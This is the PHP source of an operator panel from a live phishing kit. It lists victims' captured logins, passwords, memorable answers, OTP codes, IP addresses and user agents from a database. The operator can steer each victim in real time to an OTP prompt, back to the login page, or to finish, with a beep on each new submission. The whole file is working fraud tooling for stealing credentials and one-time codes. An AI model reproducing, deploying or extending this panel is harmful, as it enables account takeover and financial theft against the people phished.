<?php

include("../files/config.php");
$submit = $_GET['password'];
if($pass == $submit){
	$x = 'logged';
}
else{
	header('Location: index.php');
}
if($submit == ""){
	header('Location: index.php');
}
?>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="title icon" href="images/title-img.png">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
	<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
	<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
	<script src='https://code.responsivevoice.org/responsivevoice.js'></script>
	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
	<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
<nav style='background-color:#e6e6e6;position:relative;width:100%;color:#000000' >
  <a  class="navbar-brand" href="#" style='padding-left:20px;color:#000000' >LIVE - PANEL <small>by Prskorum</small> </a>
  </nav>



<body style='background-color:#ffffff;' >



<title>LIVE - PANEL</title>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script>
<script src='../files/jquery-3.4.1.min.js'></script>
<script>
function beep(){
	var sound = new Audio("../files/beep.wav");
    sound.play();
	

	
}


function buzzoff2(){

	$.ajax({
		type : 'GET',
		url : '../files/action.php?type=buzzoff2'
		})
	window.location.reload();
}

function buzzoff(){
	$.ajax({
		type : 'GET',
		url : '../files/action.php?type=buzzoff',
		success: function (data) {
			console.log(data)
		}
		})
	Swal.fire({
		icon: 'info',
		title: 'Info Has Been Submitted',
		showConfirmButton: false,
	});
}


setInterval(function() {

	$.ajax({
		type : 'GET',
		url : '../files/action.php?type=buzz',
		success: function (data) {
			console.log(data)
			if (data == '2'){
				beep();
				buzzoff();
			}
			if (data == '1'){
				buzzoff2();
			}
		}
		})


	}, 1000);



</script>


<p></p>
<br></br>

<script src='../files/jquery-3.4.1.min.js'></script>


<table class="table table-light table-striped">
          <thead style="text-align:center;">
            <tr>
              <th>User</th>
              <th>IP</th>
              <th>Status</th>
              <th>Action</th>
            </tr>
          </thead>
          <tbody style="text-align:center;" >
		  



<?php
include "../files/config.php";




$login = "1";

$sql = "SELECT * FROM hali;";
$result = $conn->query($sql);

while($row = $result->fetch_assoc()){
if ($row['status'] == 'loading'){
	$state = "<h6 style='font-size:100%;' ><span class='badge badge-success'>Loading</span></h6>";
}
elseif ($row['status'] == ''){
	$state = "<h6 style='font-size:100%;' ><span class='badge badge-danger'>Submitting</span></h6>";
}
elseif ($row['status'] == 'otp'){
	$state = "<h6 style='font-size:100%;' ><span class='badge badge-danger'>Submitting OTP</span></h6>";
}
elseif ($row['status'] == 'reset'){
	$state = "<h6 style='font-size:100%;' ><span class='badge badge-danger'>Returning...</span></h6>";
}
else{
	$state = "<h6 style='font-size:100%;' ><span class='badge badge-warning'>Unknown</span></h6>";
}


$login = $row['login'];
$pass = $row['pass'];
$answer = $row['memo'];
$otp = $row['code'];
$ip = $row['ip'];
$agent = $row['agent'];
$info = "
Login = $login
Password = $pass
Memorable = $answer
Otp = $otp
Ip = $ip
User Agent = $agent
";

	echo "   
	<form action='set.php' method='post' id='".$login."'>
	<input type='hidden' value='".$ip."' name='ip'>
	<div class='modal fade' id='exampleModal".$login."' tabindex='-1' role='dialog' aria-labelledby='exampleModalLabel' aria-hidden='true'>
	  <div class='modal-dialog' role='document'>
		<div class='modal-content'>
		  <div class='modal-header'>
			<h5 class='modal-title' id='exampleModalLabel'>Info on ".$ip."</h5>
			<button type='button' class='close' data-dismiss='modal' aria-label='Close'>
			  <span aria-hidden='true'>&times;</span>
			</button>
		  </div>
		  <div class='modal-body'>
			<textarea class=form-control disabled=disabled rows=6>".$info."</textarea>
			<br>
			<script>
			document.getElementById('asksecradio".$login."').checked == false;
			document.getElementById('paysecradio".$login."').checked == false;
			function seca".$login."(){
				if (document.getElementById('asksecradio".$login."').checked){
					document.getElementById('secquestion".$login."').style.display='block';
				}
				else{
					document.getElementById('secquestion".$login."').style.display='none';
				}
		
			}
			</script>
			<input type='hidden' name='ip' value='".$ip."'>
			<input type='radio' name='status' id='asksecradio".$login."' onclick='seca".$login."()' value='otp'> Ask OTP</input><br>
			<input pattern='[0-9]*' maxlength='4' type='text' name='otpquestion' id='secquestion".$login."' value='' class='form-control' style='display:none' placeholder='Enter OTP Code'>

			
			<input type='radio' name='status' id='askotpradio".$login."' value='reset' onclick='seca".$login."()' > Return To Login</input><br>
			<input type='radio' name='status' id='finishradio".$login."' value='finish' onclick='seca".$login."()' > Finish</input><br>
		</div>
		  <div class='modal-footer'>
			<button type='button' class='btn btn-secondary' data-dismiss='modal'>Close</button>
			<button type='submit' class='btn btn-primary'>Save changes</button>
		  </div>
		</div>
	  </div>
	</div>
	</form>
	<script style='text/javascript'>
	function showsec".$login."(){
		if(document.getElementById('asksecradio').checked)
		{
			document.getElementById('secinput').style.display='none';
		}
	}

	function showsec".$login."(){if(document.getElementById('asksecradio').checked){document.getElementById('secinput').style.display='none';}}


	</script>

		
	<tr>

		<td>".$row['login']."</td>
		<td>".$row['ip']."</td>
		<td>".$state."</td>
		<td><button type='button' class='btn btn-primary' data-toggle='modal' data-target='#exampleModal".$login."'>Action</button></td>

	</tr>
		
	";

$login = $login + "1";

}


?>


</tr>
</table>



</body>
</html>
</div>